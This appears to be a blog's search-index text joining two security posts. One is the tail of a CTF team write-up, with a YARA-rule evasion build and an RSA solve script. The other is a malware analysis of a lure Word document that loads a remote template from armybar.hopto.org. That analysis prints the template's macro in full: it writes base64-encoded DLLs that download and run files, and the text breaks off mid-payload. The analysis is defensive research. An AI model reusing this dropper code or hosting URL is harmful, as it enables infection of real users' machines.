DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) { return TRUE; } A fake dll to match the number of function imports\nThe code above will pass most of the rules already, the hardest part was adding a section that matches the standard deviation range of 61.8 - 61.9. After a lot of trial and testing, we made a binary file with random data inside, manually modifying bytes until we achieve the desired standard deviation. We also have to match the condition ($acs = { 90 90 90 90 68 ?? ?? ?? ?? C3 }) where $acs must be located at an offset of +0x2f. We can run these commands to add the section to the exe.\nobjcopy --add-section .mysection=data.txt test.exe test.exe objcopy --add-section .mysection2=data.txt test.exe test.exe objcopy --add-section .acs=acssection.bin test.exe test.exe Acssection.bin One last step before we match everything, when we compile with the version.res which will make the number of resources into 2. We will use CFF Explorer to just delete the resource\nThen, just upload the file.\nFlag : ACS{97d9bad8791993f95050bf4668f3e1351f39b21fafeb986822915ecc71d75f77}\nCrypto/Secret Encrypt After analyzing the secret function for a while, we can see that the number of iterations does not change because it uses the same secret3. Since secret1 is also a global variable, it will be updated every time we run this function.\nThis is the equations that we can derive from the script above. We know that k is the fixed number of iterations that we have to find. We know that k multiplied with output 1 we can get output 2 and same goes for output 3.\nThen we will use simultaneous equation to solve for k and remove S4. Then we can factorize both equations. From the first equation there are 2 unknowns so we cannot solve that but the second equation, we have everything we need to solve for k. After getting the value for k, we can solve for S1 and get the p_rsa and we can RSA decrypt for the flag.\nfrom Crypto.Util.number import * secret_out=[2300421886456816351333038657690265151708360443867130686953248448630531093021776734868674112240095418467093081756335930515843525383128738534202096348377560386173570623441341520395024918493491724749213178102009151013218735777147941242873009226181626903461558777748363070242458097134402254164979416319966395006, 118964893465008760906148513803880740427426131597706706568706005798920125121985562712819885692864935956027782962836691988567169040365350150416055346960755633472875717465898683139277419122088292007600766276511481224635277838009319684482964767210192366303533764466354302709679013042872343430366540326193987064645, 90822909054820019495848981290779830597424633150254073315406974106438388320012099062499510476986746519431915469091680034456400733513195561250293814032158684572016278396810686958474205299987143330650890060883372170577823300904023529858782819407737240576117609136514644966087947730563905446620136904194643698198] n=20009817089569599969538500034726137113860180378444144520680720380692155921700313466801113645321964859714346152831289324522691712373980295752612143787805513744596845142947565574859214431250136840018060927071875139532338460212335213420284901918516101557291315678272762415979902727124588156079493807073200546288791822792848832017274870268954552045671250363562973791606622534055827461929215079320844719649763363790174187688772315493266741429035524622360771778144037322337653884113230944318554468904277796127275077196154359393948582189156560613101425299832337719592901727785865373121552005054050809254799001160651919041273 enc= 17344290788163015442564038139247334246060642996020446850904852322039560290118766056392172895820951735374997354582709325518744702347901024840385769459937997819017954914367135733032234042160950809727187366403932100980467655542279928058464435224759900315683519706073455878465191841286965255617968372213737731942678587359354085082039577400390336690085883027339539322625462749425424798876860559141668103407199665082352825962061580373066150843935421008052782270096495723400071390700979281961303531001562910399929551753423625553318250211321347445434080128164118499925998330651792925936876711132409460643630484260433317617505 s2 = 2**1024 out21 = (secret_out[2] - secret_out[1])%s2 out10 = (secret_out[1] - secret_out[0])%s2 k = (out21*pow(out10,-1,s2))%s2 # k should be same for all iteration since s3 never changed out0p = (out10 * pow(k,-1,s2))%s2 s1 = (secret_out[0] - out0p)%s2 p = s1 q = n//p \u0026#39;\u0026#39;\u0026#39; p = 132790300101366058515958319162299029496405124107273636270906558644633499211040666269535156087138615191931144220498705500614664040267695307905904116245626464026778297953182366717423923687292230514699937937252522698285265470300659804575877503151767844550730621058684052444790791025203953209758824961680910607517 q = 150687339920875382113791022506874143187279559347292591253769866286725301123955523995561688927048985382258572221281989736370068559920886474787642952585643202043783643860132711115711465813075539209137582922811552548124014088150222590245888319427478214922187640615079569173552234835682647189213206202677621977869 \u0026#39;\u0026#39;\u0026#39; assert p*q == n phi = (p-1)*(q-1) d = pow(65537,-1,phi) print(long_to_bytes(pow(enc,d,n))) Moments !!! ","permalink":"http://localhost:1313/posts/acs24-team-writeup/","summary":"\u003ch1 id=\"acs2024-quals-writeup-by-teh-tarik-cendol\"\u003eACS2024 Quals Writeup by Teh Tarik Cendol\u003c/h1\u003e\n\u003cp\u003eNote: This is a team writeup and improved by \u003ca href=\"https://www.linkedin.com/in/jeremy-phang-kah-chun/\"\u003e\u003cstrong\u003eJeremy\u003c/strong\u003e\u003c/a\u003e. Source : \u003ca href=\"https://github.com/fyrepaw13/ctf_writeups/blob/main/ACS2024/README.md\"\u003eJeremy\u0026rsquo;s Github\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#Auditno-name-minor\"\u003eAudit/no-name minor\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#RevCS1338-Script-Programming\"\u003eRev/CS1338: Script Programming\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#RevSecure-Chat\"\u003eRev/Secure Chat\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#WebCan-You-REDIRECT-Me\"\u003eWeb/Can You REDIRECT Me\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#MiscDrone-Hijacking\"\u003eMisc/Drone Hijacking\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#MiscLutella\"\u003eMisc/Lutella\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#MiscHi-Alien\"\u003eMisc/Hi Alien\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#CryptoSecret-Encrypt\"\u003eCrypto/Secret Encrypt\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1 id=\"auditno-name-minor\"\u003eAudit/no-name minor\u003c/h1\u003e\n\u003cp\u003eThis was a challenge similar to the one I created for Battle of Hackers 2024 so we solved it relatively fast. The challenge provides us with a binary that presents a menu that allows the user to borrow a loan, repay the loan, mining for money, buy a name and change name.\u003c/p\u003e","title":"ACS24 Vietnam Team Teh Tarik Cendol Writeup"},{"content":"A bubarparlimen.docx file with an external RemoteLoad.dotm attached template file where it contains malicious VBA Macro which will write PE files, fetch .exe + .dll file and executing it in the infected machine. The macro uses base64 encoding method and constructing the encoded string little by little to avoid suspicion.\n2. Case Details File Name bubarparlimen.docx File Size 214.91 KiB File Type Microsoft Office Word(15.0000) MD5 afbe00e755a2cf963f0eedbb4e310198 SHA1 a55bd3f15ce743c9cda7bec05afe50b9aefa4683 SHA256 ab541df861c6045a17006969dac074a7d300c0a8edd0a5815c8b871b62ecdda7 Created Time 15/5/2024 11:47:03 PM File Name RemoteLoad.dotm File Size 23.76 KiB File Type Microsoft Office Word(15.0000) MD5 8114e5e15d4086843cf33e3fca7c945b SHA1 5f7f0b1419448c5fe1a8051ac8cb2cf7b95a3ffa SHA256 145daf50aefb7beec32556fd011e10c9eaa71e356649edfce4404409c1e8fa30 Created Time 15/5/2024 11:52:02 PM 3. Case Specific Requirements Machine Windows Environment Tools hashmyfiles olevba Microsoft Word CyberChef 4. Static Analysis 4.1 bubarparlimen.docx bubarparlimen.docx is a .docx. To go further into the analysis, it is necessary to understand what .docx structure is.\nA .docx file is essentially a ZIP archive containing XML files and directories that define the document\u0026rsquo;s content, formatting, and relationships to external or embedded resources.\nThe folder structure inside a .docx file looks like this:\ndocProps: Contains XML files that store document properties, such as the title, author, and creation date. _rels: Contains XML files that define the relationships between the various parts of the document. word: Contains the main content of the document, including the text, images, and formatting information. document.xml: Contains the actual content of the document, stored in XML format. fontTable.xml: Contains information about the fonts used in the document. settings.xml: Contains settings for the document, such as page margins and header/footer information. styles.xml: Contains the styles used in the document, such as headings and paragraph styles. [Content_Types].xml: Defines the types of content that are included in the document. reference\nThe focus now is in the word folder. Inside the word/_rels/settings.xml.rels file specifically manages relationships within the document. It maps parts of the document to external resources (e.g., images, links, macros, or OLE objects). word/_rels/settings.xml.rels is a critical file because it provides a map of how the document interacts with its environment.\nAfter extracting the bubarparlimen.docx file and going into the content of the file word/_rels/settings.xml.rels\nXML Explaination: **```\nType=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\u0026#34; Indicates this is an Attached Template relationship, which links the document to an external template file. Target=\u0026#34;https://armybar.hopto.org/RemoteLoad.dotm\u0026#34; Specifies the external resource being referenced, in this case, a template hosted on a potentially malicious domain. TargetMode=\u0026#34;External\u0026#34; Indicates the resource is external, not embedded within the .docx file. Key Findings The document references an external macro-enabled template file (.dotm file). When the document is opened in Microsoft Word, Word may attempt to load this template. The Target=\u0026quot;https://armybar.hopto.org/RemoteLoad.dotm\u0026quot; URL shows the document will download the .dotm file from armybar.hopto.org Possibly a Malicious Document Template Injection attack. RemoteLoad.dotm A .dotm file is a Microsoft Word Macro-Enabled Template file. It is used in Microsoft Word to create document templates that include pre-defined styles, formatting, and macros.\nLooking into RemoteLoad.dotm file and going into Microsoft Script Editor shows that the macros are protected with a password.\nWith olevba , the VBA macro source code can be extracted.\nOlevba Output:\nolevba RemoteLoad.dotm XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel) olevba 0.60.1 on Python 3.10.11 - http://decalage.info/python/oletools =============================================================================== FILE: RemoteLoad.dotm Type: OpenXML WARNING For now, VBA stomping cannot be detected for files in memory ------------------------------------------------------------------------------- VBA MACRO ThisDocument.cls in file: word/vbaProject.bin - OLE stream: \u0026#39;VBA/ThisDocument\u0026#39; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - Option Explicit #If VBA7 Then Private Declare PtrSafe Function FreeLibrary Lib \u0026#34;kernel32\u0026#34; (ByVal hLibModule As LongPtr) As LongPtr Private Declare PtrSafe Function LoadLibrary Lib \u0026#34;kernel32\u0026#34; Alias \u0026#34;LoadLibraryA\u0026#34; (ByVal lpLibFileName As String) As LongPtr Private Declare PtrSafe Function GetProcAddress Lib \u0026#34;kernel32\u0026#34; (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr Private Declare PtrSafe Function CallWindowProc Lib \u0026#34;user32\u0026#34; Alias \u0026#34;CallWindowProcA\u0026#34; (ByVal lpPrevWndFunc As LongPtr, ByVal hWnd As Long, ByVal Msg As Any, ByVal wParam As Any, ByVal lParam As Any) As Long #Else Private Declare Function FreeLibrary Lib \u0026#34;kernel32\u0026#34; (ByVal hLibModule As Long) As Long Private Declare Function LoadLibrary Lib \u0026#34;kernel32\u0026#34; Alias \u0026#34;LoadLibraryA\u0026#34; (ByVal lpLibFileName As String) As Long Private Declare Function GetProcAddress Lib \u0026#34;kernel32\u0026#34; (ByVal hModule As Long, ByVal lpProcName As String) As Long Private Declare Function CallWindowProc Lib \u0026#34;user32\u0026#34; Alias \u0026#34;CallWindowProcA\u0026#34; (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Any, ByVal wParam As Any, ByVal lParam As Any) As Long #End If Private Const clOneMask = 16515072 Private Const clTwoMask = 258048 Private Const clThreeMask = 4032 Private Const clFourMask = 63 Private Const clHighMask = 16711680 Private Const clMidMask = 65280 Private Const clLowMask = 255 Private Const cl2Exp18 = 262144 Private Const cl2Exp12 = 4096 Private Const cl2Exp6 = 64 Private Const cl2Exp8 = 256 Private Const cl2Exp16 = 65536 Public Function AES(sString As String) As String Dim bOut() As Byte, bIn() As Byte, bTrans(255) As Byte, lPowers6(63) As Long, lPowers12(63) As Long Dim lPowers18(63) As Long, lQuad As Long, iPad As Integer, lChar As Long, lPos As Long, sOut As String Dim lTemp As Long sString = Replace(sString, vbCr, vbNullString) sString = Replace(sString, vbLf, vbNullString) lTemp = Len(sString) Mod 4 If lTemp Then Call Err.Raise(vbObjectError, \u0026#34;MyDecode\u0026#34;, \u0026#34;Input string is not valid\u0026#34;) End If If InStrRev(sString, \u0026#34;==\u0026#34;) Then iPad = 2 ElseIf InStrRev(sString, \u0026#34;=\u0026#34;) Then iPad = 1 End If For lTemp = 0 To 255 Select Case lTemp Case 65 To 90 bTrans(lTemp) = lTemp - 65 Case 97 To 122 bTrans(lTemp) = lTemp - 71 Case 48 To 57 bTrans(lTemp) = lTemp + 4 Case 43 bTrans(lTemp) = 62 Case 47 bTrans(lTemp) = 63 End Select Next lTemp For lTemp = 0 To 63 lPowers6(lTemp) = lTemp * cl2Exp6 lPowers12(lTemp) = lTemp * cl2Exp12 lPowers18(lTemp) = lTemp * cl2Exp18 Next lTemp bIn = StrConv(sString, vbFromUnicode) ReDim bOut((((UBound(bIn) + 1) \\ 4) * 3) - 1) For lChar = 0 To UBound(bIn) Step 4 lQuad = lPowers18(bTrans(bIn(lChar))) + lPowers12(bTrans(bIn(lChar + 1))) + _ lPowers6(bTrans(bIn(lChar + 2))) + bTrans(bIn(lChar + 3)) lTemp = lQuad And clHighMask bOut(lPos) = lTemp \\ cl2Exp16 lTemp = lQuad And clMidMask bOut(lPos + 1) = lTemp \\ cl2Exp8 bOut(lPos + 2) = lQuad And clLowMask lPos = lPos + 3 Next lChar sOut = StrConv(bOut, vbUnicode) If iPad Then sOut = Left$(sOut, Len(sOut) - iPad) AES = sOut End Function Public Function MyDecode(sString As String) As String Dim TempStr As String TempStr = sString TempStr = Replace(TempStr, \u0026#34;uPCgt131\u0026#34;, \u0026#34;==\u0026#34;) TempStr = Replace(TempStr, \u0026#34;Jc34DSga\u0026#34;, \u0026#34;=\u0026#34;) MyDecode = AES(TempStr) End Function Private Sub Document_Open() On Error Resume Next Dim lgstr As String Dim FuEmdPath1 As String Dim FuEmdPath2 As String Dim cm, em Dim Stream Set cm = CreateObject(\u0026#34;Microsoft.XMLDOM\u0026#34;) Set em = cm.createElement(\u0026#34;v\u0026#34;) Set Stream = CreateObject(\u0026#34;ADODB.Stream\u0026#34;) lgstr = \u0026#34;T\u0026#34; \u0026amp; \u0026#34;V\u0026#34; \u0026amp; \u0026#34;qQA\u0026#34; \u0026amp; \u0026#34;AMAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;EAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAADdY4TFmQLqlpkC6paZAuqWRP0hlpoC6paZAuuWnQLqlmtb45ebAuqWa1vql5gC6pZrW+iXmALqllJpY2iZAuqW\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUEUAAEwBAwAxUuFdAAAAAAAAAADgAAIhCwEOAAACAAAABgAAAAAAAAAAAAAAEAAAACAAAAAAABAAEAAAAAIAAAYAAAAAAAAABgAAAAAAAAAAQAAAAAQAAAAAAAACAEAFAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAsCAAAE0AAAC0IQAAKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAgAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;cCAAADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAAIAAAAAAEAAAAAIAAAAEAAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAAA4AgAAACAAAAAEAAAABgAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAAIAAAAAAwAAAAAgAAAAoAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFWL7FZoICAAEP8VDCAAEIvwhfZ0HGgsIAAQVv8VACAAEIXAdAX/dRD/0Fb/FQQgABBoRCAAEP8VDCAAEIvwhfZ0JWhQIAAQVv8VACAAEIXAdA5qAGoA/3UU/3UQagD/0Fb/FQQgABBeXcPMzMzMzMxVi+xqAP91FP8VCCAAEF3D\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;ACIAABIiAAAgIgAA8CEAAAAAAAAAAAAAAAAAAAAAAABXaW5pbmV0LmRsbABEZWxldGVVcmxDYWNoZUVudHJ5QQAAAABVcmxtb24uZGxsAABVUkxEb3dubG9hZFRvRmlsZUEAAAAAAAAAAAAAAAAAAAAAAAAxUuFdAAAAAA0AAAC0AAAAACEAAAAHAAAAAAAAMVLhXQAAAAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMVLhXQAAAADsIAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AQAAAAIAAAACAAAA2CAAAOAgAADoIAAAcBAAAAAQAAD1IAAA+SAAAAAAAQB1dGZjLmRsbABSQ1AAUkNUAAAAAEdDVEwAEAAAgAAAAC50ZXh0JG1uAAAAAAAgAAAUAAAALmlkYXRhJDUAAAAAICAAAIgAAAAucmRhdGEAALAgAABNAAAALmVkYXRhAAAAIQAAtAAAAC5yZGF0YSR6enpkYmcAAAC0IQAAFAAAAC5pZGF0YSQyAAAAAMghAAAUAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;LmlkYXRhJDMAAAAA3CEAABQAAAAuaWRhdGEkNAAAAADwIQAASAAAAC5pZGF0YSQ2AAAAANwhAAAAAAAAAAAAACoiAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIgAAEiIAACAiAADwIQAAAAAAAKUDTG9hZExpYnJhcnlBAACdAkdldFByb2NBZGRyZXNzAACeAUZyZWVMaWJyYXJ5AM4FV2luRXhlYwBLRVJORUwzMi5kbGwAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAgAAAABTALMBYwHTAtMDIwODBDMEowYzB6MAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; FuEmdPath1 = Environ(\u0026#34;PUBLIC\u0026#34;) \u0026amp; \u0026#34;\\sl1.tmp\u0026#34; em.Text = lgstr em.DataType = \u0026#34;bin.base64\u0026#34; Stream.Type = 1 Stream.Open Stream.Write em.NodeTypedValue Stream.SaveToFile FuEmdPath1, 2 lgstr = \u0026#34;T\u0026#34; \u0026amp; \u0026#34;V\u0026#34; \u0026amp; \u0026#34;qQA\u0026#34; \u0026amp; \u0026#34;AMAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;EAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAADdY4TFmQLqlpkC6paZAuqWRP0hlpoC6paZAuuWnQLqlmtb45ebAuqWa1vql5gC6pZrW+iXmALqllJpY2iZAuqW\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUEUAAGSGAwBgjOFdAAAAAAAAAADwACIgCwIOAAACAAAABgAAAAAAAAAAAAAAEAAAAAAAgAEAAAAAEAAAAAIAAAYAAAAAAAAABgAAAAAAAAAAQAAAAAQAAAAAAAACAGABAAAQAAAAAAAAEAAAAAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAEAAAAKAhAABaAAAA/CEAACgAAAAAAAAAAAAAAAAwAAAMAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAIAgAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAAC8AAAAABAAAAACAAAABAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAAmAIAAAAgAAAABAAAAAYAAAAAAAAAAAAAAAAAAEAAAEAucGRhdGEAAAwAAAAAMAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAIAAAAKAAAAAAAAAAAAAAAAAABAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiJXCQISIl0JBBXSIPsMEiNDRoQAABJi/FJi/j/FfYPAABIi9hIhcB0I0iNFQ8QAABIi8j/FcYPAABIhcB0BUiLz//QSIvL/xW7DwAASI0NBBAAAP8Vvg8AAEiL2EiFwHQ0SI0V/w8AAEiLyP8Vjg8AAEiFwHQWRTPJSMdEJCAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAATIvGSIvXM8n/0EiLy/8Vcg8AAEiLXCRASIt0JEhIg8QwX8PMzMzMzMzMzMzMM9JJi8lI/yVUDwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;YCIAAAAAAAByIgAAAAAAAIAiAAAAAAAAUCIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV2luaW5ldC5kbGwAAAAAAERlbGV0ZVVybENhY2hlRW50cnlBAAAAAFVybG1vbi5kbGwAAAAAAABVUkxEb3dubG9hZFRvRmlsZUEAAAAAAAAAAAAAYIzhXQAAAAANAAAA1AAAALggAAC4BgAAAAAAAGCM4V0AAAAADgAAAAAAAAAAAAAAAAAAAEdDVEwAEAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;vAAAAC50ZXh0JG1uAAAAAAAgAAAoAAAALmlkYXRhJDUAAAAAMCAAAIgAAAAucmRhdGEAALggAADUAAAALnJkYXRhJHp6emRiZwAAAIwhAAAQAAAALnhkYXRhAACgIQAAWgAAAC5lZGF0YQAA/CEAABQAAAAuaWRhdGEkMgAAAAAQIgAAFAAAAC5pZGF0YSQzAAAAACgiAAAoAAAALmlkYXRhJDQAAAAAUCIAAEgAAAAuaWRhdGEkNgAAAAAAMAAA\u0026#34; lgstr = lgstr \u0026amp; \u0026#34;DAAAAC5wZGF0YQAAAQ8GAA9kCQAPNAgAD1ILcAAAAAAAAAAAX4zhXQAAAADcIQAAAQAAAAIAAAACAAAAyCEAANAhAADYIQAAsBAAAAAQAADyIQAA9iEAAAAAAQBVcmxEb3dubG9hZFRvRmlsZS5kbGwAUkNQAFJDVAAAACgiAAAAAAAAAAAAAIoiAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYCIAAAAAAAByIgAAAAAAAIAiAAAAAAAA\u0026#34; lgstr = lgstr \u0026amp; 